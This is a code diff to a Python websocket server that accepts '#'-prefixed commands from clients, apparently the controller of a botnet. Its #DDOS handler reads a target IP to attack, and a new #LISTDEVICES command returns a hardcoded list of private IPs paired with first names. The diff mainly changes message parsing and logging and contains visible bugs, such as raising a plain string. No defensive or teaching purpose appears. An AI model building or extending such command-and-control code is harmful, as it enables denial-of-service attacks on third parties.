@@ -91,9 +91,14 @@ class Server:
             if msg[0] != "#":
                 raise Exception("Comming Message Error")
             else:
-                _ = msg.find(' ')
-                ms = msg[:_].strip().upper()
-                tag = msg[_+1:].strip().split()
+                _ = msg.split()
+                if len(_) != 1:
+                    ms = _[0]
+                    tag = _[1:]
+                else:
+                    ms = _[0]
+                    tag = []
+
                 return (tag, ms)
 
         except Exception as e:
@@ -115,10 +120,8 @@ class Server:
         print(f"Websocket client connected from {ws.remote_address}")
         try:
             msg = await ws.recv()
-            print(msg)
             if (msg == "#INIT"):
                 msg = await ws.recv()
-                print(msg)
                 tag, msg = Server._parser(msg)
                 await self._mssgHandler(tag, msg, ws)
 
@@ -134,7 +137,7 @@ class Server:
             await ws.close()
             print(f"WS Connection closed {ws.remote_address}")
 
-    async def _mssgHandler(self, tag, msg, ws):  # complete
+    async def _mssgHandler(self, tag, msg, ws):
         try:
             if msg == "#CHECK":  # CHECK id
                 if len(tag) != 1:
@@ -184,8 +187,10 @@ class Server:
             i = self._clientFindByWS(ws)
             while True:
                 tag, msg = Server._parser(await ws.recv())
-
-                if msg == "#DDOS":
+                print(msg)
+                if msg == "#LISTDEVICES":
+                    await ws.send(json.dumps([("192.168.1.1","ercin"),("192.168.1.2","can")]))
+                elif msg == "#DDOS":
                     if len(tag) != 1:
                         raise ("Tag error from DDOS")
                     targetIP = tag[0]
